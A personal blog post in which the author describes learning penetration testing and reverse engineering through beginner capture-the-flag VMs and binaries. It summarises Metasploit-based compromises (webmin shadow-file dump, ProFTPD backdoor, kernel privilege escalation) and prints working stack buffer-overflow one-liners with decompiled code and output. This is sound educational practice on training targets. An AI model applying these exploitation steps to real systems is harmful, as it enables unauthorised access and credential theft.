---
title: Hacking Capture the Flags
author: jon
layout: post
categories:
  - Software
image: 2020/GHIDRA_1_thumb.jpg
---

I've been learning the basics of penetration testing and reverse engineering by doing capture the flag (CTF) puzzles.

I've always been interested in what real hacking entails, but previously I found the background knowledge in assembly and system behavior to be too daunting. While the hacks themselves are fairly straightforward, I wasn't able to understand the details of what was going on to my satisfaction. After some of my recent projects with assembly like [x86 boot loading]({% post_url 2020-01-16-x86-boot-loading %}), I was able to feel comfortable enough to tackle these beginner exercises.

I ended up doing CTFs that fall into two general categories:

 * penetration testing - This is what I'll call the CTFs where you are given a site or a virtual machine. You probe the exposed ports and find vulnerabilities allowing you to gain access and find flags.
 * reverse engineering - You are given a binary and either need to extract a flag contained in it, or if it's running on a remote server, read another file on that server.

Besides these two categories of CTFs, the other main difference was how "realistic" they tried to be. Some were closer to logic puzzles that didn't heavily require finding exploits or brute forcing passwords, while others were much more "realistic". I found that a bit confusing, since they require very different mind sets if you're solving a riddle, or just need to set up a cracking tool and let it run for a few hours.

# Penetration Testing

To get started, I set up a virtual machine running [Kali Linux](https://www.kali.org/). This is a distribution that comes prepackaged with a range of penetration testing tools including the [Metasploit exploit framework](https://www.metasploit.com/). This tool set is a bit overwhelming, but the Kali distribution actually makes the tools somewhat discoverable. The start menu gives the categories of tools to make finding things easier, and <https://tools.kali.org/tools-listing> also has the categorized tools with documentation.

There is a pretty steep learning curve to all the complex tools, but I definitely had the most trouble with the pipeline for searching for relevant exploits. Metasploit has a built in search function and I realized the exploitdb (searchsploit CLI tool) had a totally seperate list of exploits in addition. What I learned about these tools most came from trying to reproduce the walk throughs other people wrote for the CTFs.

## Initial Scan

Getting started with each of these CTFs was pretty much the same. The first thing I had to figure out was how to connect the two VMs. I'd have the Kali VM, and the CTF VM both running at the same time. I'm using VMWare Workstation player so I just set them both to NAT networking which puts them on the same LAN. From Kali I could use netdiscover to find the other VM's IP.

With that I'd run nmap `nmap -A -p- $IP_ADDR` to do a full port scan and identify any common services. Based on those results I'd go through them to try to solve the puzzle.

### pWnOS: 1.0

[Link to download and full walkthrough](https://www.hackingarticles.in/hack-the-pwnos-1-0-boot-to-root/)

This was the first CTF I did. Rather then capture the flag this has the more realistic goal of getting root access on the VM.

Since this was my first attempt i ended up pretty much just following the walkthrough. At a high level these are the steps:

1. Based on the nmap results you can see that there's a webserver running an application called webmin.
2. Searching metasploit turns up an exploit that lets you dump the password shadow file that contains hashes of the users passwords.
3. Using a password cracking tool you can find the password to one of the accounts.
4. Using those credentials you can login over SSH.
5. The walkthrough didn't do a great job of explaining how they then identified a vulnerability to get a privilege escalation to root. I guess they searched the kernel version in searchsploit to find the vulnerability. This leads you to a C file to copy over.
6. I used scp instead of running a web server to copy the file over. Then you just build and run it to get root.

### Basic Pentesting: 1

[Link to download and full walkthrough](https://www.hackingarticles.in/hack-the-basic-penetration-vm-boot2root-challenge/)

I actually found a completely different solution from the one in the walkthrough.

1. I first focused on the FTP server. The nmap results describe it as ProFTPD 1.3.3c .
2. Searching for that ProFTPD version, I found the Metasploit module exploit/unix/ftp/proftpd_133c_backdoor. Running the exploit gave shell access and let me to grab the shadow file with a password hash for marlinspike, and I could add my ssh key to get SSH access as well.
3. The password which can be guessed or bruteforced is marlinspike, and the account has root access.

### Pumpkin Garden CTF

[Link to download and full walkthrough](https://www.hackingarticles.in/pumpkingarden-vulnhub-walkthrough/)

This one was a little confusing since it definitely was more puzzly then the other ones. So required a bit of a different approach. For the most part I solved this one the same as the walkthrough, but hit a couple snags.

1. At one point you find a secret file with the string "c2NhcmVjcm93IDogNVFuQCR5" in it. I got stuck here since I didn't realize you were supposed to use decode64 to turn it into readable ASCII.
2. When it came to running the actual exploit I had a lot of problems until I realized the text file in the exploitdb had Windows style new lines. Not sure how that happened, but one I switched to just `\n` I was able to run the script fine.

# Reverse Engineering

I actually tended to prefer these challenges since they were a bit less open ended and more contained.

When it came to the heavy lifting of analyzing a runnable binary, I mostly used:

* [Ghidra](https://ghidra-sre.org/) - a decompiler
* [gdbgui](https://www.gdbgui.com/) - a graphical wrapper for the GDB debugger

Along with a lot of basic command line tools like:
* strings - dump the ascii strings from a file
* file - give the binary header data
* binwalk - search a binary for structured data
* xxd - a hex viewing tool
* cat, printf, echo, tail, etc. - manipulate strings fed into the files

I found most of these CTFs on <https://guyinatuxedo.github.io/>. Unfortunately, it was often hard or impossible to find the binaries, so I was limited to the challenges where I could actually find a file to go with it.

### Google Beginner CTF

<https://capturetheflag.withgoogle.com/#beginners/>

I started off with this one, and didn't look up a walkthrough.

It's got a cute little story and is broken into mini puzzles with branching paths.

1. First puzzle is just running strings on the binary
2. For the second puzzle I ran the executable and after finding a link in one of the menus I got a text string that base64 decoded to: Username: wireshark-rocks Password: start-sniffing!
  a. from there I ran wireshark and when watching the conversation saw the plaintext password
3. From there I took the "Home" path and hit a pretty big difficulty spike (for me)
  a. Initially I took the NTFS volume and mounted in in Linux. I quickly found the only real file was "Users\Family\Documents\credentials.txt". This file gives the hint "I keep pictures of my credentials in extended attributes."
  b. I spent a good chunk of time trying to read the extended attributes in Linux without any luck. It's almost certainly possible, but for whatever reason was giving me a ton of trouble.
  c. Next I copied the image to a USB drive and mounted it in Windows. Once again I went through a ton of tools trying to read the extended attributes. I got pretty close with "Active @ Disk Editor". If I inspected the file record I could see a data record that pointed to some compressed data elsewhere in the disk. Following this showed chunks of PNG data, but I couldn't find a good way to directly dump the data. I spent a bunch of time trying to understand the NTFS record layout.
  e. Eventually, I got fed up and found the tool <http://www.nirsoft.net/utils/alternate_data_streams.html> which pulled out the png without any fuss.

That frustrated me enough that I decided to call it quits there.

### Pwn1

[Walkthrough with download](https://github.com/zst-ctf/tamuctf-2019-writeups/tree/master/Solved/Pwn1)

This was a pretty cute one. Ghidra decompiles the code fine:

```c
undefined4 main(void)

{
  int iVar1;
  char local_43 [43];
  int local_18;
  undefined4 local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere theother side he see."
      );
  puts("What... is your name?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

This means we need to enter a few Monty Python quotes, then have the input overflow to overwrite local_18 on the stack. I did this with:

`(cat answers.txt; echo -e $'0123456789012345678901234567890123456789012\xc8\x10\xa1\xde'; cat) | ./pwn1`

where answers.txt has the answers to the first couple questions.

### Just Do It

[Walkthrough with download](https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/)

Ghidra decompiles it to:

```c
undefined4 main(void)
 
{
  char *pcVar1;
  int iVar2;
  char local_28 [16];
  FILE *local_18;
  char *local_14;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pcVar1 = fgets(flag,0x30,local_18);
  if (pcVar1 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,PASSWORD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}
```
 
Here the strategy was to make the pointer used by the final `puts` point to the flag.
 
Since the flag is at 0x0804a080 in Ghidra I used the command:
 
`printf '12345678901234567890\x80\xa0\x04\x08' | ./just`
 
Initially didn't work since I needed to add null char to my test flag file

I spent a lot of time refreshing myself in GDB to figure out where I went wrong.

### BELEAF  

[Download](https://github.com/KevOrr/ctf-writeups/tree/master/2019/csaw/rev/beleaf)

This one was a bit different since it wasn't as straight forward. Decompiling it in Ghidra showed that the password is run through a sort of simple hashing function then compared with set of hashed values. I pulled out the code and wrote a program to reverse the mapping:

```c
#include <stdio.h>

char hash_data[] = {
		0x77, 0x00, 0x00, 0x00,
		0x66, 0x00, 0x00, 0x00,
		0x7b, 0x00, 0x00, 0x00,
		0x5f, 0x00, 0x00, 0x00,
		0x6e, 0x00, 0x00, 0x00,
		0x79, 0x00, 0x00, 0x00,
		0x7d, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff,
		0x62, 0x00, 0x00, 0x00,
		0x6c, 0x00, 0x00, 0x00,
		0x72, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0x61, 0x00, 0x00, 0x00, 0x65, 0x00, 0x00, 0x00, 0x69, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0x6f, 0x00, 0x00, 0x00, 0x74, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x67, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x75, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff};


char SOLUTION[] = {
0x01, 0x09,
0x11, 0x27,
0x02, 0x00,
0x12, 0x03,
0x08, 0x12,
0x09, 0x12,
0x11, 0x01,
0x03, 0x13,
0x04, 0x03,
0x05, 0x15,
0x2e, 0x0a,
0x03, 0x0a,
0x12, 0x03,
0x01, 0x2e,
0x16, 0x2e,
0x0a, 0x12, 0x06};


long FUN_hashes(char param_1)

{
	long local_10;

	local_10 = 0;
	while ((local_10 != -1 && ((int)param_1 != *(int*)(hash_data + local_10 * 4)))) {
		if ((int)param_1 < *(int*)(hash_data + local_10 * 4)) {
			local_10 = local_10 * 2 + 1;
		}
		else {
			if (*(int*)(hash_data + local_10 * 4) < (int)param_1) {
				local_10 = (local_10 + 1) * 2;
			}
		}
		if (local_10 * 4 > sizeof(hash_data)) {
			return -1;
		}
	}
	return local_10;
}

int main() {

	const char TEST_STR[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

	for (const char* ptr = TEST_STR; *ptr != 0; ptr++) {
		printf("%c -> %i\n", *ptr, FUN_hashes(*ptr));
	}
	char mapping[64];
	for (int i = 0; i < sizeof(hash_data) / 4; i++) {
		char c = hash_data[i * 4];
		if (c != -1) {
			printf("%i -> %c\n", i, c);
			mapping[i] = c;
		}
	}
	for (int i = 0; i < sizeof(SOLUTION); i++) {
		printf("%c", mapping[SOLUTION[i]]);
	}

	return 0;
}
```
### tuctf 2017 vulnchat 

[Download](https://github.com/j3rrry/Writeups/tree/master/CTF/2017/TU/Pwn/vuln%20chat)

 
Running it on Ubuntu 20.4 64 bit:

```
➜ chmod 777 vuln-chat  
➜ ./vuln-chat  
zsh: no such file or directory: ./vuln-chat 
➜ file vuln-chat  
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped 
```

Since I am on a 64 bit system I needed to follow: 
https://askubuntu.com/questions/454253/how-to-run-32-bit-app-in-ubuntu-64-bit 
to recognize the executable.

Running it now did:
``` 
➜ ./vuln-chat  
----------- Welcome to vuln-chat ------------- 
Enter your username: cat 
Welcome cat! 
Connecting to 'djinn' 
--- 'djinn' has joined your chat --- 
djinn: I have the information. But how do I know I can trust you? 
cat: Cats? 
djinn: Sorry. That's not good enough 
```

Running Ghidra gave:
```c
undefined4 main(void) 
{ 
  undefined local_31 [20]; 
  undefined local_1d [20]; 
  undefined4 local_9; 
  undefined local_5; 
  setvbuf(stdout,(char *)0x0,2,0x14); 
  puts("----------- Welcome to vuln-chat -------------"); 
  printf("Enter your username: "); 
  local_9 = 0x73303325; 
  local_5 = 0; 
  __isoc99_scanf(&local_9,local_1d);
  printf("Welcome %s!\n",local_1d);
  puts("Connecting to \'djinn\'"); 
  sleep(1); 
  puts("--- \'djinn\' has joined your chat ---"); 
  puts("djinn: I have the information. But how do I know I can trust you?"); 
  printf("%s: ",local_1d); 
  __isoc99_scanf(&local_9,local_31); 
  puts("djinn: Sorry. That\'s not good enough"); 
  fflush(stdout); 
  return 0; 
}
```

scanf format is 0x73303325; which is "%30s" 

Found a function that prints the flag at 0x0804856b 

```c
void printFlag(void)
{ 
  system("/bin/cat ./flag.txt"); 
  puts("Use it wisely"); 
  return; 
} 
```

This was the first problem where I needed to jump to a totally different function. I vaguely remembered that the return pointer for a function call is on the stack so probably I'd need to overflow one of the scanf calls to corrupt the return pointer. Based on the structure I figured I'd probably first need to modify the format string with the first scanf to allow reading more data, then modify the the return pointer in the second call. I Googled and found <http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf> to confirm my basic idea of how the return pointer works.

I then used GDB to watch to execution of the code. I saw the current return pointer went to 0xf7deaee5. Looking at the registers:

```
esp	0xffffd0f0	top of stack	 
ebp	0xffffd128	stack base pointer 
```

Looking at the memory base the base pointed I found the return pointer:

```
➜ x $ebp+4
0xffffd12c:  0xf7deaee5 
```
 
The array scanf is writing to starts at 0xffffd10f  ( $ebp - 0x19 ) so I needed to write 25+4+4 where the last 4 overwrite the return. Since that's greater then 30 I needed to do it on the second pass, after corrupting the format string. There it needs to write 45+4+4 so we need to make the string support writing at least 53 bytes 


```
➜  echo "CTF{whatever}" >> flag.txt 
➜  (echo -e $'01234567890123456789%60s\x00'; echo -e $'0123456789012345678901234567890123456789012345678\x6b\x85\x04\x08';) | ./vuln-chat 
----------- Welcome to vuln-chat ------------- 
Enter your username: Welcome 01234567890123456789%60s! 
Connecting to 'djinn' 
--- 'djinn' has joined your chat --- 
djinn: I have the information. But how do I know I can trust you? 
01234567890123456789%60s: djinn: Sorry. That's not good enough 
CTF{whatever} 
Use it wisely 
[1]    4760 done                              ( echo -e $'01234567890123456789%60s\x00'; echo -e ; ) | 
       4761 segmentation fault (core dumped)  ./vuln-chat 
```
Could have figured out just from Ghidra, but since I wasn't familiar with stack layout, GDB helped 
